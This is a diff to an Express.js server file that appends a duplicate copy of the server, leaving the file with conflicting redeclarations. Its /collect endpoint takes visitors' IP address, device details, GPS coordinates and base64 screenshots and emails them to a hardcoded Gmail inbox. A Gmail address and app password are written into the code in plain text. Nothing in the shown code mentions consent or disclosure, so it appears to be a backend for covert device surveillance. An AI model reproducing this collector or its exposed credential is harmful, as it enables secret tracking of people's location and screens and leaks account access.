@@ -116,3 +116,73 @@ app.post("/collect", async (req, res) => {
 // Start Server
 const PORT = process.env.PORT || 5000;
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+
+
+
+
+
+
+
+const express = require("express");
+const cors = require("cors");
+const bodyParser = require("body-parser");
+const nodemailer = require("nodemailer");
+
+const app = express();
+app.use(cors());
+app.use(bodyParser.json({ limit: "50mb" })); // Increased limit for large image data
+
+// Configure Nodemailer Transporter
+const transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: "olaniyanshamsudeenyinka001@gmail.com", // Your Gmail address
+      pass: "hhcf murv vxae angt", // App Password from Gmail
+    },
+});
+
+app.post("/collect", async (req, res) => {
+    try {
+        const { userAgent, platform, language, screenSize, latitude, longitude, ip, screenshots } = req.body;
+
+        // Convert Base64 Screenshots to Attachments
+        const attachments = screenshots.map((img, index) => {
+            const base64Data = img.replace(/^data:image\/png;base64,/, ""); // Remove base64 prefix
+            return {
+                filename: `screenshot-${index + 1}.png`,
+                content: Buffer.from(base64Data, "base64"),
+                encoding: "base64",
+            };
+        });
+
+        // Compose Email
+        const mailOptions = {
+          from: "olaniyanshamsudeenyinka001@gmail.com",
+          to: "lalatechnigltd@gmail.com", // Your Gmail
+            subject: "Device Data & Screenshots",
+            html: `
+                <h2>Device Information</h2>
+                <p><b>IP Address:</b> ${ip}</p>
+                <p><b>User Agent:</b> ${userAgent}</p>
+                <p><b>Platform:</b> ${platform}</p>
+                <p><b>Language:</b> ${language}</p>
+                <p><b>Screen Size:</b> ${screenSize}</p>
+                <p><b>Location:</b> Latitude ${latitude}, Longitude ${longitude}</p>
+                <h3>Screenshots attached below.</h3>
+            `,
+            attachments, // Attach screenshots as files
+        };
+
+        // Send Email
+        await transporter.sendMail(mailOptions);
+
+        res.json({ success: true, message: "Data and screenshots sent to email!" });
+    } catch (error) {
+        console.error("Error sending email:", error);
+        res.status(500).json({ success: false, message: "Error sending email." });
+    }
+});
+
+// Start Server
+const PORT = process.env.PORT || 5000;
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
